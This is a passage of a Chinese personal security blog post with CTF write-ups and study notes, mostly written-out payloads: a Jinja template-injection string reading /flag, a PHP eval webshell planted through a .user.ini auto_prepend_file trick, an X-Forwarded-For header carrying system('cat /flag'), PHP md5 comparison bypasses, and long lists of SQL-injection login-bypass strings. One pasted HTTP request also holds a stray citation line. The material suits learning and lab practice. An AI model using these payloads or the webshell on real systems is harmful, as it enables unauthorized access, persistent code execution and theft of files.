+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:62433/?username=&#123;&#123;().__class__.__base__.__subclasses__()[X].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/flag&#x27;).read()&#125;&#125;&amp;password=any</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="怎么多了个没用的php文件"><a href="#怎么多了个没用的php文件" class="headerlink" title="怎么多了个没用的php文件"></a>怎么多了个没用的php文件</h3><p>.user.ini 是 PHP 配置文件 php.ini 的补充文件。当通过 Web 服务器访问 PHP 页面时，PHP 会在当前执行的脚本所在目录及其上层目录中查找是否存在 .user.ini 文件。如果找到，便会将其中的配置指令合并到主 php.ini 设置中，并作为 CGI 或 FastCGI 进程的启动参数。</p>
+<p>虽然 php.ini 限制了许多关键配置仅能在全局范围内修改，但 .user.ini 仍允许用户控制部分设置，其中之一便是 <code>auto_prepend_file</code> 指令。该指令用于指定一个文件，PHP 会在执行同一目录下的所有脚本之前自动包含该文件，使其成为脚本执行的预处理部分。</p>
+<p>利用这一机制，攻击者可上传一个自定义的 .user.ini 文件，并通过设置 <code>auto_prepend_file</code> 指向某个包含恶意代码（如一句话木马）的文件。此后，只要访问该目录下的任何 PHP 脚本，都会自动加载该恶意文件，从而实现持久化的代码执行能力。为进一步完成攻击，攻击者通常还需上传一个包含恶意代码的预包含文件。</p>
+<p>文件一</p>
+<p>sh.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件二</p>
+<p>.user.ini</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = sh.jpg</span><br></pre></td></tr></table></figure>
+
+<p>用蚁剑连接即可</p>
+<h3 id="看看ip"><a href="#看看ip" class="headerlink" title="看看ip"></a>看看ip</h3><p>抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /?format=json HTTP/1.1</span><br><span class="line">Host: api.ipify.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://node6.anna.nssctf.cn:23286/</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:23286</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Priority: u=0</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>发现网站并没有用复杂的技术来获取IP，而是简单地让的浏览器去调用一个第三方IP查询API</p>
+<p>如果服务器信任客户端传来的某些HTTP头信息，就可能被欺骗。最常用的头就是 <code>X-Forwarded-For</code> (XFF)。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: node6.anna.nssctf.cn:23286</span><br><span class="line">X-Forwarded-For:&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br><span class="line">Content-Length: 417</span><br><span class="line"></span><br><span class="line">ref(APA): piter.piterの小窝.https://npiter.tech. Retrieved 2025/9/21.</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include_once(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;</span><br><span class="line">    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;</span><br><span class="line">        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;</span><br><span class="line">            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &quot;yee&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;nop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;go on&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;let&#x27;s get some php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; let&#x27;s get some php</span><br></pre></td></tr></table></figure>
+
+<p>hackbar send post payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=a&amp;b1[]=1&amp;b2[]=2&amp;c1=s878926199a&amp;c2=s155964671a</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="SQL之万能秘钥学习"><a href="#SQL之万能秘钥学习" class="headerlink" title="SQL之万能秘钥学习"></a>SQL之万能秘钥学习</h2><p>正常的SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;输入的用户名&#x27; AND password = &#x27;输入的密码&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>用户输入 <code>admin</code> 和 <code>123456</code>，生成的SQL语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;admin&#x27; AND password = &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>当我们输入     ‘ OR ‘1’&#x3D;’1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;随便输入什么都行&#x27; AND password = &#x27;&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><code>username = &#39;随便输入什么都行&#39;</code> → False</p>
+<p><code>password = &#39;123456&#39;</code> → False</p>
+<p>(False AND False) OR True   —-&gt;    Ture</p>
+<p>搬运<a href="%5B%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E4%B8%8ESQL%E6%B3%A8%E5%85%A5-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/hxhxhxhxx/article/details/108020010)">佬的blog</a></p>
+<p>参考链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">https://blog.csdn.net/hxhxhxhxx/article/details/108020010</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=&#x27;1</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">admin</span><br><span class="line">admin&#x27;--</span><br><span class="line">admin&#x27; or 4=4--</span><br><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27;--</span><br><span class="line">admin888</span><br><span class="line">&quot;or &quot;a&quot;=&quot;a</span><br><span class="line">admin&#x27; or 2=2#</span><br><span class="line">a&#x27; having 1=1#</span><br><span class="line">a&#x27; having 1=1--</span><br><span class="line">admin&#x27; or &#x27;2&#x27;=&#x27;2</span><br><span class="line">&#x27;)or(&#x27;a&#x27;=&#x27;a</span><br><span class="line">or 4=4--</span><br><span class="line">c</span><br><span class="line">a&#x27;or&#x27; 4=4--</span><br><span class="line">&quot;or 4=4--</span><br><span class="line">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="line">&quot;or&quot;=&quot;a&#x27;=&#x27;a</span><br><span class="line">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27;=1</span><br><span class="line">1 or &#x27;1&#x27;=&#x27;1&#x27; or 4=4</span><br><span class="line">&#x27;OR 4=4%00</span><br><span class="line">&quot;or 4=4%00</span><br><span class="line">&#x27;xor</span><br><span class="line">admin&#x27; UNION Select 1,1,1 FROM admin Where &#x27;&#x27;=&#x27;</span><br><span class="line">1</span><br><span class="line">-1%cf&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">1</span><br><span class="line">17..admin&#x27; or &#x27;a&#x27;=&#x27;a 密码随便</span><br><span class="line">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="line">&#x27;or 4=4/*</span><br><span class="line">something</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br><span class="line">admin&#x27; OR 4=4/*</span><br><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>asp aspx万能密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1：”or “a”=”a</span><br><span class="line">2： ‘)or(‘a’=’a</span><br><span class="line">3：or 1=1–</span><br><span class="line">4：’or 1=1–</span><br><span class="line">5：a’or’ 1=1–</span><br><span class="line">6：”or 1=1–</span><br><span class="line">7：’or’a’=’a</span><br><span class="line">8：”or”=”a’=’a</span><br><span class="line">9：’or”=’</span><br><span class="line">10：’or’=’or’</span><br><span class="line">11: 1 or ‘1’=’1’=1</span><br><span class="line">12: 1 or ‘1’=’1’ or 1=1</span><br><span class="line">13: ‘OR 1=1%00</span><br><span class="line">14: “or 1=1%00</span><br><span class="line">15: ‘xor</span><br><span class="line">16: 用户名 ’ UNION Select 1,1,1 FROM admin Where ”=’ （替换表名admin）</span><br><span class="line">密码 1</span><br><span class="line">17…admin’ or ‘a’=’a 密码随便</span><br></pre></td></tr></table></figure>
+
+<p>PHP万能密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‘or 1=1/*</span><br><span class="line">User: something</span><br><span class="line">Pass: ’ OR ‘1’=’1</span><br></pre></td></tr></table></figure>
+
+<p>jsp 万能密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1’or’1’=’1</span><br><span class="line">admin’ OR 1=1/*</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>linkpwn
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" title="渗透学习">http://linkpwn.github.io/2025/07/29/渗透学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/07/28/smc/" rel="prev" title="smc">
+      <i class="fa fa-chevron-left"></i> smc
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="next" title="流量分析">
+      流量分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF"><span class="nav-number">1.</span> <span class="nav-text">渗透之路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80"><span class="nav-number">1.1.</span> <span class="nav-text">计算机基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux"><span class="nav-number">1.1.1.</span> <span class="nav-text">linux</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#linux%E5%91%BD%E4%BB%A4"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">linux命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kali-linux%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">kali linux进行渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="nav-number">1.1.1.2.1.</span> <span class="nav-text">渗透测试流程</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88Reconnaissance%EF%BC%89"><span class="nav-number">1.1.1.2.1.1.</span> <span class="nav-text">信息收集（Reconnaissance）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD"><span class="nav-number">1.1.2.</span> <span class="nav-text">核心功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%83%E4%B9%A0"><span class="nav-number">1.2.</span> <span class="nav-text">练习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E7%A5%9E%E7%A7%98%E7%9A%84%E6%89%8B%E9%95%AF"><span class="nav-number">1.2.1.</span> <span class="nav-text">第一章 神秘的手镯</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%97%AE%E5%89%91%E7%9F%B3%EF%BC%81%E7%AF%A1%E5%A4%A9%E6%94%B9%E5%91%BD%EF%BC%81"><span class="nav-number">1.2.2.</span> <span class="nav-text">第三章 问剑石！篡天改命！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E7%8E%89%E9%AD%84%E7%8E%84%E5%85%B3%C2%B7%E7%A0%B4%E5%A6%84"><span class="nav-number">1.2.3.</span> <span class="nav-text">第十二章 玉魄玄关·破妄</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E7%AB%A0-%E6%89%93%E4%B8%8A%E9%97%A8%E6%9D%A5%EF%BC%81"><span class="nav-number">1.2.4.</span> <span class="nav-text">第五章 打上门来！</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">1.2.5.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NSSCTF-hardrce"><span class="nav-number">1.2.6.</span> <span class="nav-text">NSSCTF hardrce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AB%A0-%E6%98%86%E4%BB%91%E6%98%9F%E9%80%94"><span class="nav-number">1.2.7.</span> <span class="nav-text">第十六章 昆仑星途</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E9%87%91%E6%9B%A6%E7%A0%B4%E7%A6%81%E4%B8%8E%E4%B8%83%E7%BB%9D%E5%82%80%E5%84%A1%E9%98%B5"><span class="nav-number">1.2.8.</span> <span class="nav-text">第四章 金曦破禁与七绝傀儡阵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AB%A0-%E9%80%9A%E5%B9%BD%E5%85%B3%C2%B7%E7%81%B5%E7%BA%B9%E8%AF%A1%E5%BD%B1"><span class="nav-number">1.2.9.</span> <span class="nav-text">第十三章 通幽关·灵纹诡影</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%83%E7%AB%A0-%E6%98%9F%E9%AA%B8%E8%BF%B7%E9%98%B5%C2%B7%E7%A5%9E%E5%BF%B5%E9%87%8D%E6%9E%84"><span class="nav-number">1.2.10.</span> <span class="nav-text">第十七章 星骸迷阵·神念重构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-SSTI"><span class="nav-number">1.2.11.</span> <span class="nav-text">ez_SSTI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E7%AB%A0-%E5%B9%BD%E5%86%A5%E8%A1%80%E6%B5%B7%C2%B7%E5%B9%BB%E8%AF%AD%E5%BF%83%E9%AD%94"><span class="nav-number">1.2.12.</span> <span class="nav-text">第二十章 幽冥血海·幻语心魔</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E5%A4%9A%E4%BA%86%E4%B8%AA%E6%B2%A1%E7%94%A8%E7%9A%84php%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.13.</span> <span class="nav-text">怎么多了个没用的php文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%8B%E7%9C%8Bip"><span class="nav-number">1.2.14.</span> <span class="nav-text">看看ip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyphp"><span class="nav-number">1.2.15.</span> <span class="nav-text">babyphp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E4%B9%8B%E4%B8%87%E8%83%BD%E7%A7%98%E9%92%A5%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.3.</span> <span class="nav-text">SQL之万能秘钥学习</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
